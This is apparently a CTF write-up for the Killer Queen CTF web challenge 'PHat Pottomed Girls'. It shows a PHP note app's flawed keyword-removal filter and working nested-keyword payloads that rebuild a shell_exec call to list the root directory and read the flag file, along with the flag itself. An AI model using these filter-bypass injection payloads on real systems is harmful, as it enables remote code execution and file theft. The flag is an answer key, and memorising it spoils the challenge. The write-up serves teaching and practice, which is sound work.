---
layout: writeup
title: PHat Pottomed Girls
ctf: Killer Queen CTF
points: 189
solves: 249
tags: 
    - web
date: 2021-11-01
description: |-
    Now it's attempt number 3 and this time with a Queen reference!
    (flag is in the root directory)
flag: flag{wait_but_i_fixed_it_after_my_last_two_blunders_i_even_filtered_three_times_:(((}
---
<details>
    <summary>tl;dr</summary>
    
</details>

***

## Introduction

We are given a website where we can type in a note that is then stored as a php-file and can be viewed again.

We are also given the source code which runs the code

```php
<?php
$newnote = $_POST["notewrite"];

//3rd times the charm and I've learned my lesson. Now I'll make sure to filter more than once :)
$notetoadd = filter($newnote);
$notetoadd = filter($notetoadd);
$notetoadd = filter($notetoadd);

$filename = generateRandomString();
array_push($_SESSION["notes"], "$filename.php");
file_put_contents("$filename.php", $notetoadd);
?>
```

So it takes our input, performs a filter function three times, and stores the result in a PHP file.

We take a look at the filter function:

```php
function filter($originalstring) {
    $notetoadd = str_replace("<?php", "", $originalstring);
    $notetoadd = str_replace("?>", "", $notetoadd);
    $notetoadd = str_replace("<?", "", $notetoadd);
    $notetoadd = str_replace("flag", "", $notetoadd);

    $notetoadd = str_replace("fopen", "", $notetoadd);
    $notetoadd = str_replace("fread", "", $notetoadd);
    $notetoadd = str_replace("file_get_contents", "", $notetoadd);
    $notetoadd = str_replace("fgets", "", $notetoadd);
    $notetoadd = str_replace("cat", "", $notetoadd);
    $notetoadd = str_replace("strings", "", $notetoadd);
    $notetoadd = str_replace("less", "", $notetoadd);
    $notetoadd = str_replace("more", "", $notetoadd);
    $notetoadd = str_replace("head", "", $notetoadd);
    $notetoadd = str_replace("tail", "", $notetoadd);
    $notetoadd = str_replace("dd", "", $notetoadd);
    $notetoadd = str_replace("cut", "", $notetoadd);
    $notetoadd = str_replace("grep", "", $notetoadd);
    $notetoadd = str_replace("tac", "", $notetoadd);
    $notetoadd = str_replace("awk", "", $notetoadd);
    $notetoadd = str_replace("sed", "", $notetoadd);
    $notetoadd = str_replace("read", "", $notetoadd);
    $notetoadd = str_replace("system", "", $notetoadd);

    return $notetoadd;
}
```

This looks for a number of patterns and remove them if found. If we can write a note with the contents `<?php echo shell_exec("cat /flag") ?>`, then we would get the flag when visiting the note page.

What we can do to make sure our keywords aren't removed is, we can insert a keyword from later in the list within - then this will be removed and what we want stands back, e.g. inserting some `cat`s withing:

```
<cat?php echo shell_exec("cacatt /flacatg") ??>>
```
This will after one filter round become what we wanted. This trick can be applied any number of times, and we can input the following text, and see how it filters down:
```
<cacacattt?php echo shell_exec("cacacacatttt /flacacacatttg") ????>>>>
<cacatt?php echo shell_exec("cacacattt /flacacattg") ???>>>
<cat?php echo shell_exec("cacatt /flacatg") ??>>
<?php echo shell_exec("cat /flag") ?>
```

This idea is good but doesn't immediately work, so perhaps the flag is named something else. We can just run an `ls` command on the root to find it:

```
<cacacattt?php echo shell_exec("ls /") ????>>>>
```
We find the file `flag.php`, so we can run
```
<cacacattt?php echo shell_exec("cacacacatttt /flacacacatttg.php") ????>>>>
```
to get the flag.